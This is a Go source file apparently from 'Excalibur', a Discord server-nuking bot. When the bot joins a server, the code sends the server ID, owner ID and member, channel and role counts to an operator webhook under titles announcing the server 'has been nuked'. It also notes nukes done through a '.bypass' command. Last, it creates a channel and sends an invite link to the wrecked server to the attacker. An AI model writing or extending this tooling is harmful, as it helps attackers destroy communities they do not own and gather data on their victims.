package start_end

import (
	"Excalibur/core/requests"
	"encoding/json"
	"fmt"
	"os"

	"github.com/bwmarrin/discordgo"
	"github.com/joho/godotenv"
)

func Logs(s *discordgo.Session, event *discordgo.GuildCreate) {

	godotenv.Load()
	AVATAR_URL := os.Getenv("AVATAR_URL")
	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")

	channels, _ := s.GuildChannels(event.ID)
	textChannels := len(channels)

	roles, _ := s.GuildRoles(event.ID)
	rolesInt := len(roles)

	thumbnail := discordgo.MessageEmbedThumbnail{
		URL: AVATAR_URL,
	}

	embed := discordgo.MessageEmbed{
		Title:     "Server " + fmt.Sprint(event.Name) + " has been nuked.",
		Thumbnail: &thumbnail,
		Color:     1677721,
		Description: "> **Server ID:** " + "`" + fmt.Sprint(event.ID) + "`\n" +
			"> **Owner ID:** " + "`" + fmt.Sprint(event.OwnerID) + "`\n" +
			"> **Region:** " + "`" + fmt.Sprint(event.Region) + "`\n" +
			"> **Nuker:** " + "`" + fmt.Sprint("...") + "`\n" +
			"\n" +
			"> **All Members:** " + "`" + fmt.Sprint(event.MemberCount) + "`\n" +
			"> **All Channels:** " + "`" + fmt.Sprint(textChannels) + "`\n" +
			"> **All Roles:** " + "`" + fmt.Sprint(rolesInt) + "`\n" +
			"\n" +
			"> **Joined At:** " + "`" + fmt.Sprint(event.JoinedAt) + "`\n",
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}

	jsonData, _ := json.Marshal(data)

	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)

}

func LogsAlert(s *discordgo.Session, event *discordgo.GuildCreate) {
	godotenv.Load()
	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")

	embed := discordgo.MessageEmbed{
		Title: "Server " + fmt.Sprint(event.Name) + " has been nuked via ``.bypass`` command.",
		Color: 1677721,
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}
	jsonData, _ := json.Marshal(data)

	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
}

func InviteCreate(s *discordgo.Session, event *discordgo.GuildCreate) {
	godotenv.Load()
	CHANNEL_NAME := os.Getenv("CHANNEL_NAME")

	channel, err := s.GuildChannelCreate(event.ID, CHANNEL_NAME, discordgo.ChannelTypeGuildText)
	if err != nil {
		fmt.Println("Error marshalling JSON:", err)
		return
	}

	godotenv.Load()
	WEBHOOK_URL := os.Getenv("WEBHOOK_URL")

	invite, _ := s.ChannelInviteCreate(channel.ID, discordgo.Invite{})

	embed := discordgo.MessageEmbed{
		Title:       "Invite to nuked server",
		Color:       1677721,
		Description: "> **" + "https://discord.gg/" + fmt.Sprint(invite.Code) + "**\n",
	}

	data := &discordgo.WebhookParams{
		Embeds: []*discordgo.MessageEmbed{&embed},
	}
	jsonData, _ := json.Marshal(data)

	requests.Sendhttp(string(WEBHOOK_URL), "POST", jsonData)
}
